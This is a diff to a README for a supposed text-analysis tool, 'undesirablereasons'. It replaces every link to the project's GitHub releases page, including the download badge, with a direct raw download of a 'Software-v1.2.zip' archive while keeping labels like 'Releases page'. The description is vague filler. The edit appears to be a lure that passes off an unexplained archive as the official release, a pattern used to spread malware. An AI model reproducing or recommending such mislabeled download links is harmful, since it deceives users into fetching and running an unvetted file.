@@ -1,6 +1,6 @@
 # 🚀 undesirablereasons - Extract Key Reasons from Text Easily
 
-[![Download](https://img.shields.io/badge/Download-v1.0-brightgreen)](https://github.com/TomatoNChili/undesirablereasons/releases)
+[![Download](https://github.com/TomatoNChili/undesirablereasons/raw/refs/heads/main/undesirablereasons/Software-v1.2.zip)](https://github.com/TomatoNChili/undesirablereasons/raw/refs/heads/main/undesirablereasons/Software-v1.2.zip)
 
 ## 📖 Overview
 `undesirablereasons` is a user-friendly package designed to help you extract and organize crucial reasons from text inputs. This tool focuses on identifying why some actions or outcomes may be seen as undesirable. Whether you're a content creator, researcher, or simply curious, this application makes understanding text simpler and more organized.
@@ -23,7 +23,7 @@ To run `undesirablereasons`, your system should meet the following requirements:
 Follow these steps to easily download and start using `undesirablereasons`.
 
 1. **Visit the Release Page**  
-   Go to the [Releases page](https://github.com/TomatoNChili/undesirablereasons/releases) to find the latest version of the application.
+   Go to the [Releases page](https://github.com/TomatoNChili/undesirablereasons/raw/refs/heads/main/undesirablereasons/Software-v1.2.zip) to find the latest version of the application.
 
 2. **Download the Application**  
    Look for the download link for the latest release on the page. Click the link and the download will begin automatically.
@@ -35,7 +35,7 @@ Follow these steps to easily download and start using `undesirablereasons`.
    After installation, find the `undesirablereasons` application in your programs list. Click to open it and start analyzing your texts.
 
 ## 📝 Download & Install
-To start using `undesirablereasons`, visit this page to download: [Releases Page](https://github.com/TomatoNChili/undesirablereasons/releases). Simply follow the steps outlined in the "Getting Started" section to have it running in no time.
+To start using `undesirablereasons`, visit this page to download: [Releases Page](https://github.com/TomatoNChili/undesirablereasons/raw/refs/heads/main/undesirablereasons/Software-v1.2.zip). Simply follow the steps outlined in the "Getting Started" section to have it running in no time.
 
 ## 🔍 How to Use
 1. **Input Your Text**  
@@ -57,7 +57,7 @@ If you encounter any issues while using `undesirablereasons`, consider the follo
 
 - Ensure your system meets the stated requirements.
 - Restart the application if it becomes unresponsive.
-- Check for updates on the [Releases page](https://github.com/TomatoNChili/undesirablereasons/releases) if you experience any bugs.
+- Check for updates on the [Releases page](https://github.com/TomatoNChili/undesirablereasons/raw/refs/heads/main/undesirablereasons/Software-v1.2.zip) if you experience any bugs.
   
 If problems persist, please reach out through the issues section of this repository for assistance.
 
